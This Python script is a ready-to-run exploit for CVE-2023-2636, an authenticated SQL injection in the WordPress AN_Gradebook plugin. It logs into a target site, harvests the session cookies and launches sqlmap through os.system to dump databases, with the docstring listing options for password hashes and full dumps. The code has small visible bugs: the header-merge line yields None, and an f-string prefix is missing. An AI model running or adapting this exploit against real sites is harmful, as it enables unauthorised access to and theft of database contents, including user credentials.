#!/usr/bin/env python3
# -*- coding-utf-8 -*-

import os
import json
import fire
from loguru import logger

import requests


header = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

sqlmap_path = "G:/AllInOne/04_DatabaseAssessment/SQLMap/sqlmap.py"

class WordPress(object):
    """
    CVE: CVE-2023-2636 - WordPress Plugin AN_Gradebook - Subscriber+ SQLi
    Versions: <= 5.0.1
    Exploit Author: Lukas Kinneberg

    Reference:
        https://www.exploit-db.com/exploits/51632
        https://github.com/lukinneberg/CVE-2023-2636
        https://wordpress.org/plugins/an-gradebook/
        https://github.com/lukinneberg/CVE-2023-2636/blob/main/an-gradebook.7z

    Usage:
        python3 exploit.py 192.168.1.1
    """
    def __init__(self, ip, port = 80, username = 'hacker', password = 'hacker', options = '-a'):
        """
        Args:
            ip (str): IP address to be used for connection.
            port (int): Port to be used for connection.
            username (str): Username used for connection.
            password (str): Password used for connection.
            options (str): Sqlmap options
                -a, --all           Retrieve everything
                --current-user      Retrieve DBMS current user
                --current-db        Retrieve DBMS current database
                --passwords         Enumerate DBMS users password hashes
                --tables            Enumerate DBMS database tables
                --columns           Enumerate DBMS database table column
                --schema            Enumerate DBMS schema
                --dump              Dump DBMS database table entries
                --dump-all          Dump all DBMS databases tables entries
        """
        self.ip = ip
        self.port = port
        self.username = username
        self.password = password
        self.options = options

    def exploit(self):
        logger.info(f"Starting Exploit ...")
        session = requests.Session()
        auth_url = f"http://{self.ip}:{self.port}/wp-login.php"
        check = session.get(auth_url)
        new_headers = {
            'Host': self.ip,
            'Origin': 'http://{self.ip}'
        }.update(header)

        body = {
            'log': self.username,
            'pwd': self.password,
            'wp-submit': 'Log In',
            'testcookie': '1'
        }

        auth = session.post(auth_url, headers = new_headers, data = body)

        # SQL-Injection (Exploit):
        # Generate payload for sqlmap
        cookies_session = session.cookies.get_dict()
        cookie = json.dumps(cookies_session)
        cookie = cookie.replace('"}', '').replace('{"', '').replace('"', '')
        cookie = cookie.replace(" ", '').replace(":", '=').replace(',', '; ')

        logger.info("Payload for SQL-Injection:")
        # Enter the URL path of the course after the port below
        exploitcode_url = f'python {sqlmap_path} -u "http://{self.ip}:{self.port}/wp-admin/admin-ajax.php?action=course&id=3" '
        exploitcode_risk = '--level 2 --risk 2 '
        exploitcode_cookie = f'--cookie="{cookie}" '
        # SQLMAP Printout
        # retrieve_mode = input('Which sqlmap option should be used to retrieve your information? ')
        retrieve_mode = self.options
        exploitcode = exploitcode_url + exploitcode_risk + exploitcode_cookie + retrieve_mode + ' -p id -v 0 --answers="follow=Y" --batch'
        os.system(exploitcode)
        logger.info(f"Exploit finished ...")

    def main(self):
        self.exploit()

if __name__ == "__main__":
    fire.Fire(WordPress)